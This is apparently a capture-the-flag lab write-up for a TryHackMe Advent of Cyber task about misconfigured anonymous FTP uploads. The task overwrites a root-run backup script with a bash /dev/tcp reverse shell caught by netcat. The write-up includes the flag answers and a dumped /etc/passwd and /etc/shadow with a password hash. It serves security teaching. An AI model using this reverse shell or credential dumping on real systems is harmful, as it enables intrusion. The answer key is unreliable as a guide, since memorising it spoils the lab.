

Day 9: Anyone can be Santa - Prelude:
﻿Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.

9.1. Getting Started
Before we begin, we're going to need to deploy two Instances:

    The THM AttackBox by pressing the "Start AttackBox" button at the top-right of the page.
    The vulnerable Instance attached to this task by pressing the "Deploy" button at the top-right of this task/day.

Made with ❤ by CMNatic

9.2. Today's Learning Objectives:
Understand the fundamentals of an FTP file server and some common misconfigurations to ultimately exploit these ourselves to gain entry to tbfc-ftp-01.



9.3. What is FTP & Where is it Used?
The File Transfer Protocol (FTP) offers a no-thrills means of file sharing in comparison to alternative
protocols available. Whilst this protocol is unencrypted, it can be accessed through a variety of means; from dedicated software like FileZilla, the command line, or web browsers, FTP Servers have been long used to share files between devices across the Internet due to its compatibility.


Accessing an FTP server using the Mozilla Firefox Web Browser.

FTP uses two connections when transferring data, as illustrated below:


(Cyberhoot., 2020)

The standard for these two connections are the two ports:

    Port 20 (Data)
    Port 21 (Commands)

Commands involve actions such as listing or navigating directories, writing to files. Whereas, the data port is where actual data such as the downloading/uploading of files are transferred over.



9.4. No Credentials? No Problem! 
Before any data can be shared, the client must log in to the FTP Server. This is to determine the commands that the client has the permission to execute, and the data that can be shared. Some websites use FTP to share files instead of the web server itself. Of course, this means that you'd have to share a username/password through some other way - that's not practical.

Enter FTP's "Anonymous" mode...This setting allows a default username to be used with any password by a client. This user is treated like any other user on the FTP server - including enforcing permissions and privileges to commands and data.



9.5. Using FTP Over Terminal



We're going to be using the "FTP" package that comes installed on most Linux environments but especially the THM AttackBox.To connect, we simply use ftp and provide the IP address of the Instance. In my case, I would use ftp 10.10.185.239, but you would need to use ftp MACHINE_IP for your vulnerable Instance.

When prompted for our "Name", we enter "anonymous". If successful, we have confirmed that the FTP Server has "anonymous" mode enabled - successful login looking like so:

You can use the help command to list some of the commands you can run whilst connected to the FTP Server. Here's a quick rundown of the fundamentals:
Command 	Description
ls 	List files and directories in the working directory on the FTP server
cd 	Change our working directory on the FTP server
get 	Download a file from the FTP server to our device
put 	Upload a file from our device to the FTP server

Let's look at the directories available to us using ls. There is only one folder with data that our user has permission to access:

We'll navigate to this using cd to change our working directory and then  ls to list the contents. The file within this folder contains a file with a ".sh" extension. This extension is a shell script, that when executed, will run commands that we program. Let's use get to get the file from the server onto our device, so we understand why this file has been left here!



9.6. Finding our Exploit
With the file downloaded, let's open it on our device using a terminal text editor such as nano.

We don't need to understand what happens here outside of the comments. The script executes every minute (according to Elf McEager), creates a backup of a folder and stores it in Elf McEager's home directory. What if we were to replace the commands executed in this script with our own, malicious commands? Uploading a file requires separate permission that shouldn't be granted to the "anonymous" user. However, permissions are very easy to oversight - such as in the case here.

9.6.1. Let's use pentesters cheatsheet to get a good command that will be executed by the server to
generate a shell to our AttackBox, replacing the IP_ADDRESS with your TryHackMe IP, this address is displayed on the navigation bar on the Access page.

bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1

9.6.2. Let's set up a netcat listener to catch the connection on our AttackBox: nc -lvnp 4444

9.6.3. We'll now attempt to upload our malicious script to the folder that we have write permissions on the FTP server by returning to our FTP prompt
and using put to put the file into that directory (ensuring it is your current directory).

9.6.4. Return to our netcat listener, after waiting one minute, you should see an output like below! Success! We have a reverse system shell on the FTP Server as the most powerful user. Any commands you now use will execute on the FTP server's system.

Proceed to use commands similar to what we have used before to find the contents of root.txt located in the root directory! Let's break down exactly what happened here and explain the reasons as why this exploit happened:

9.6.5.1. The FTP Server has anonymous mode enabled allowing us to authenticate. This isn't inherently
insecure and has many legitimate uses.

9.6.5.2. We've discovered that we have permission to upload and download files. Whilst is also normal behaviour for FTP servers, anonymous users should not be able to upload files.

9.6.5.3. We've interpreted the information from a legitimate backup script to create a reverse shell onto our host.

9.6.5.4. The script executes as the "root" user - the most powerful on a Linux system. This is also a vulnerability, as now we have full access to the system. The use of this user should be restricted wherever possible. If the script were to execute as "elfmceager", we'd only have access to the system as that user (a much less powerful one in comparison)



9.7. Conclusion, where to go from here and additional Material:
We've covered the fundamentals of FTP servers and why they're still used today. Not only this, but
we've also learned how simple misconfigurations can lead to a full-blown hack on an FTP Server. If you're keen to learn more, the Network Services walkthrough room (created by Polomints) also covers FTP. If you wish to sharpen your skills,
you may find the "Anonymous" Challenge room (created by Nameless0ne) a fun dojo.





Question #1: Name the directory on the FTP server that has data accessible by the "anonymous" user
'''
public
'''


Question #2: What script gets executed within this directory?
'''
backup.sh
'''


Question #3: What movie did Santa have on his Christmas shopping list?
'''
The Polar Express
'''


Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have setup a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting frm
'''
THM{even_you_can_be_santa}
'''




root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
elfmceager:x:1000:1000:cmnatic:/home/elfmceager:/bin/bash
ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin



root:*:18113:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18113:0:99999:7:::
uuidd:*:18113:0:99999:7:::
dnsmasq:*:18113:0:99999:7:::
landscape:*:18113:0:99999:7:::
pollinate:*:18113:0:99999:7:::
sshd:*:18582:0:99999:7:::
elfmceager:$6$qYEPhsLqReHEKyfi$p844t2RZubsgRL8CWLlAnFu7BUugQFXVPV5DS/MdHUAu63wGnWOs4CUyhvDV2sA3LIxpOWdSOS1QCPW/l9xN90:18582:0:99999:7:::
ftp:*:18582:0:99999:7:::
